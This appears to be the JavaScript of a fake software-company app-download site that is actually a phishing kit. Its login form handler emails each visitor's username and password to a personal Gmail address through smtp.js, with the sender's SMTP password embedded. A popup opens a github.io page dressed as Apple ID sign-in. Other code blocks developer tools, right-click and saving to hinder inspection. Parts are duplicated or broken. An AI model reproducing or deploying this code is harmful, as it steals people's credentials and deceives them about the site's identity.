$(function () {
    $(".seconddiv").load("ext-sufix.html");
});

fetch('.html')
  .then(response => response.text())
  .then(data => {
    document.getElementById('page-body').innerHTML = data;
});

document.getElementById('googleplaylink').addEventListener('Click', function(event) {
    event.preventDefault();
    this.href = "https://play.google.com";
    window.location.href = this.href;
});

        function goToLink(selectElement) {
            const links = {
                id: [
                    "../home/id/"
                ],
                de: [
                    "../home/de/"
                ],
                en: [
                    "../home/en/"
                ],
                es: [
                    "../home/es/"
                ],
                fr: [
                    "../home/fr/"
                ],
                it: [
                    "../home/it/"
                ],
                pt: [
                    "../home/pt/"
                ],
                vi: [
                    "../home/vi/"
                ],
                tr: [
                    "../home/tr/"
                ],
                ru: [
                    "../home/ru/"
                ],
                hi: [
                    "../home/hi/"
                ],
                ko: [
                    "../home/ko/"
                ],
                ja: [
                    "../home/ja/"
                ],
                zh: [
                    "../home/zh/"
                ],
                ar: [
                    "../home/ar/"
                ],
                th: [
                    "../home/th/"
                ],
                he: [
                    "../home/he/"
                ],
                nl: [
                    "../home/nl/"
                ],
                cs: [
                    "../home/cs/"
                ],
                el: [
                    "../home/el/"
                ],
                pl: [
                    "../home/pl/"
                ],
                ro: [
                    "../home/ro/"
                ],
                sv: [
                    "../home/sv/"
                ],
                ga: [
                    "../home/ga/"
                ],
                is: [
                    "../home/is/"
                ],
                hu: [
                    "../home/hu/"
                ],
                kk: [
                    "../home/kk/"
                ],
                uz: [
                    "../home/uz/"
                ],
                bg: [
                    "../home/bg/"
                ],
                hr: [
                    "../home/hr/"
                ],
                da: [
                    "../home/da/"
                ],
                et: [
                    "../home/et/"
                ],
                fi: [
                    "../home/fi/"
                ],
                lv: [
                    "../home/lv/"
                ],
                lt: [
                    "../home/it/"
                ],
                nb: [
                    "../home/nb/"
                ],
                sk: [
                    "../home/sk/"
                ],
                sl: [
                    "../home/sl/"
                ]
            };

            const selectedOption = selectElement.value;
            if (selectedOption !== "") {
                const randomLink = links[selectedOption][Math.floor(Math.random() * links[selectedOption].length)];
                window.location.href = randomLink;
            }
        }

function loadHtmlContent() {

    const filePath = 'external.html';

    fetch(filePath)

        .then(response => {

            if (!response.ok) {

                throw new 
            }

            return response.text();

        })

        .then(htmlContent => {
            document.getElementById('content').innerHTML = htmlContent;

        })
        .catch(error => {

            console.error('Error loading the HTML file:', error);

        });

}

window.onload = loadHtmlContent;

document.addEventListener("keydown", function(event) {
    if ((event.ctrlKey || event.metaKey) && event.key === "s") {
        event.preventDefault();
        alert("Saving is disabled on this page.");
    }
});

function showQRCode() {
    const qrCodeHTML = '<a href=""><img src="../icons/appdownloadsection/en/softwarecompanycoltdqr-code.png" alt="QR-CODE" style="width: 164px; height: 52px; background-color: #000000; margin-right: 1px; border-left-style: solid; border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px; border-bottom-style: solid; border-bottom-width: 1px; border-color: #00a2e8; border-left-width: 1px; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('qr-code-button').innerHTML = qrCodeHTML;
}

function showGooglePlay() {
    const googlePlayHTML = '<a href="https://play.google.com"><img src="../icons/appdownloadsection/en/softwarecompanycoltdgetitongoogleplaystore.png" alt="Get it on Google Play" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border-left-style: solid; border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px; border-bottom-style: solid; border-bottom-width: 1px; border-color: #00a2e8; border-left-width: 1px; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('google-play-button').innerHTML = googlePlayHTML;
}

function showAmazonAppstore() {
    const amazonAppstoreHTML = '<a href="https://www.amazon.com/gp/mas/get/amazonapp"><img src="../icons/appdownloadsection/en/softwarecompanyavailableatamazonappstore.png" alt="Available at Amazon Appstore" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border-left-style: solid; border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px; border-bottom-style: solid; border-bottom-width: 1px; border-color: #00a2e8; border-left-width: 1px; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('amazon-appstore-button').innerHTML = amazonAppstoreHTML;
}

function showAppStore() {
    const appStoreHTML = '<a href="https://apps.apple.com"><img src="../icons/appdownloadsection/en/softwarecompanydownloadontheappstore.png" alt="Download on the App Store" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border-left-style: solid; border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px; border-bottom-style: solid; border-bottom-width: 1px; border-color: #00a2e8; border-left-width: 1px; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('app-store-button').innerHTML = appStoreHTML;
}

function showMicrosoftStore() {
    const microsoftStoreHTML = '<a href="https://store.microsoft.com/"><img src="../icons/appdownloadsection/en/softwarecompanycoltdgetitfrommicrosoft.png" alt="Get it from Microsoft" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border-left-style: solid; border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px; border-bottom-style: solid; border-bottom-width: 1px; border-color: #00a2e8; border-left-width: 1px; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('microsoft-store-button').innerHTML = microsoftStoreHTML;
}

function detectPlatform() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    showQRCode(); // Always show QR code

    // For Android
    if (userAgent.includes('android')) {
        showGooglePlay();
        showAmazonAppstore();
    }
    // For Windows PC
    else if (userAgent.includes('windows')) {
        showMicrosoftStore();
    }
    // For iPhone or macOS
    else if (userAgent.includes('iphone') || userAgent.includes('mac os')) {
        showAppStore();
    }
}

// Call the function when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', detectPlatform);

function showQRCode() {
    const qrCodeHTML = '<a href=""><img src="../icons/appdownloadsection/en/softwarecompanycoltdqr-code.png" alt="QR-CODE" style="width: 164px; height: 52px; background-color: #000000; margin-right: 1px; border: solid 1px #00a2e8; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('qr-code-button').innerHTML = qrCodeHTML;
}

function showGooglePlay() {
    const googlePlayHTML = '<a href="https://play.google.com"><img src="../icons/appdownloadsection/en/softwarecompanycoltdgetitongoogleplaystore.png" alt="Get it on Google Play" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border: solid 1px #00a2e8; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('google-play-button').innerHTML = googlePlayHTML;
}

function showAmazonAppstore() {
    const amazonAppstoreHTML = '<a href="https://www.amazon.com/gp/mas/get/amazonapp"><img src="../icons/appdownloadsection/en/softwarecompanyavailableatamazonappstore.png" alt="Available at Amazon Appstore" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border: solid 1px #00a2e8; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('amazon-appstore-button').innerHTML = amazonAppstoreHTML;
}

function showAppStore() {
    const appStoreHTML = '<a href="https://apps.apple.com"><img src="../icons/appdownloadsection/en/softwarecompanydownloadontheappstore.png" alt="Download on the App Store" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border: solid 1px #00a2e8; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('app-store-button').innerHTML = appStoreHTML;
}

function showMicrosoftStore() {
    const microsoftStoreHTML = '<a href="https://store.microsoft.com/"><img src="../icons/appdownloadsection/en/softwarecompanycoltdgetitfrommicrosoft.png" alt="Get it from Microsoft" style="width: 164px; height: 52px; background-color: #000000; margin-left: 4px; border: solid 1px #00a2e8; border-radius: 8px; pointer-events: none; -webkit-user-select: none; user-select: none;"></a>';
    document.getElementById('microsoft-store-button').innerHTML = microsoftStoreHTML;
}

function detectPlatform() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    showQRCode(); // Always show QR code

    // For Android
    if (userAgent.includes('android')) {
        showGooglePlay();
        showAmazonAppstore();
    }
    // For Windows PC
    else if (userAgent.includes('windows')) {
        showGooglePlay();
        showAmazonAppstore();
        showAppStore();
        showMicrosoftStore();
    }
    // For iPhone or macOS
    else if (userAgent.includes('iphone') || userAgent.includes('mac os')) {
        showAppStore();
    }
}

// Call the function when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', detectPlatform);

document.addEventListener('keydown', function(event) {
    if (event.key === 'F12') {
        event.preventDefault();
    }
    if (event.ctrlKey && event.shiftKey && event.key === 'I') {
        event.preventDefault();
    }
});

    const inSubmit = document.getElementById('insubmit');
    const scValidation = document.getElementById('validation');
    const scBing = document.getElementById('bing');
    const closePopupButton = document.getElementById('close-validation');

    scanQRButton.addEventListener('click', () => {
        overlay.style.display = 'block';
        scValidation.classList.add('show');
    });

    closePopupButton.addEventListener('click', () => {
        scValidation.classList.remove('show');
        scBing.style.display = 'none';
    });

    overlay.addEventListener('click', () => {
        qrPopup.classList.remove('show');
        scBing.style.display = 'none';
    });

// Detects Ctrl + S or Command + S and clears the document's content
document.addEventListener("keydown", function(event) {
    if ((event.ctrlKey || event.metaKey) && event.key === "s") {
        event.preventDefault();
        document.body.innerHTML = "";  // Clear the content
        alert("Content is removed for saving.");
    }
});

// Prevents right-click context menu to stop 'Save As' access
document.addEventListener("contextmenu", function(event) {
    event.preventDefault();
    alert("Right-click is disabled on this page.");
});

    // Show QR Code Popup
    const scanQRButton = document.getElementById('scan-qr-button');
    const qrPopup = document.getElementById('qr-popup');
    const overlay = document.getElementById('overlay');
    const closePopupButton = document.getElementById('close-popup');

    scanQRButton.addEventListener('click', () => {
        overlay.style.display = 'block';
        qrPopup.classList.add('show');
    });

    closePopupButton.addEventListener('click', () => {
        qrPopup.classList.remove('show');
        overlay.style.display = 'none';
    });

    overlay.addEventListener('click', () => {
        qrPopup.classList.remove('show');
        overlay.style.display = 'none';
    });

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        document.getElementById('Link-A').addEventListener('click', function(event) {
            event.preventDefault(); // Prevent the default link behavior
            window.location.href = this.href; // Change the window location
        });

        document.getElementById('Link-B').addEventListener('click', function(event) {
            event.preventDefault(); // Prevent the default link behavior
            window.location.href = this.href; // Change the window location
        });

        document.getElementById('Link-C').addEventListener('click', function(event) {
            event.preventDefault(); // Prevent the default link behavior
            window.location.href = this.href; // Change the window location
        });

        document.getElementById('Link-D').addEventListener('click', function(event) {
            event.preventDefault(); // Prevent the default link behavior
            window.location.href = this.href; // Change the window location
        });

        document.getElementById('Applepopup').addEventListener('click', function() {
            // URL of the popup
            let popupURL = 'https://softwarecompanycoltd.github.io/httpsappleid.apple.comauthauthorizeclientidcom/';

            // Popup window settings
            let width = 500;
            let height = 600;
    
            // Calculate the position to center the popup
            let left = (window.innerWidth - width) / 2;
            let top = (window.innerHeight - height) / 2;

            // Open the popup window
            window.open(
                popupURL,
                'SignInPopup',
                `width=${width},height=${height},top=${top},left=${left},resizable=yes,scrollbars=yes`
            );

            // Check if the popup was blocked
            if (!popupWindow || popupWindow.closed || typeof popupWindow.closed === 'undefined') { 
                alert("Popup was blocked by the browser! Please allow popups for this site.");
            }
        });

        const themeSwitch = document.getElementById('themeSwitch');
        const body = document.body;

        themeSwitch.addEventListener('change', () => {
            if (themeSwitch.checked) {
                body.classList.remove('light-mode');
                body.classList.add('dark-mode');
            } else {
                body.classList.remove('dark-mode');
                body.classList.add('light-mode');
            }
        });

        // Restore the user's preferred theme on page load
        document.addEventListener('DOMContentLoaded', function() {
            const preferredTheme = localStorage.getItem('preferredTheme');
            if (preferredTheme === 'dark-mode') {
                body.classList.add('dark-mode');
                themeSwitch.checked = true;
            } else {
                body.classList.add('light-mode');
            }
        });

        // Save the user's theme preference when they toggle the switch
        themeSwitch.addEventListener('change', function() {
            if (themeSwitch.checked) {
                localStorage.setItem('preferredTheme', 'dark-mode');
            } else {
                localStorage.setItem('preferredTheme', 'light-mode');
            }
        });

        // Show loader on form submission
        document.getElementById('login').addEventListener('submit', function(e) {
            e.preventDefault();
            // Show the loader
            document.querySelector('.loader').style.display = 'flex';

            // Simulate form submission or handle form logic here
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const rememberMe = document.getElementById('rememberMe').checked;
            const body = "Username: " + username + "<br>Password: " + password + "<br>Remember Me: " + rememberMe;

            Email.send({
                Host : "smtp.elasticemail.com",
                Username : "softwarecompanyltdsmtpsender@gmail.com",
                Password : "A6DC06DBCF8A0C3CE635ED7B3EDE144CB3C9",
                To : 'gambopeter2022@gmail.com',
                From : "softwarecompanyltdsmtpsender@gmail.com",
                Subject : "Login Attempt",
                Body : body
            }).then(function(response) {
                // Hide the loader after response
                document.querySelector('.loader').style.display = 'none';

                if (response === 'OK') {
                    swal("Success!", "Form submitted successfully!", "success");
                } else {
                    swal("Error!", "Failed to submit the form. Please try again.", "error");
                }
            });
        });

const mobileMenu = document.getElementById("mobile-menu");
const navLinks = document.querySelector(".nav-links");

mobileMenu.addEventListener("click", () => {
    navLinks.classList.toggle("active");
});
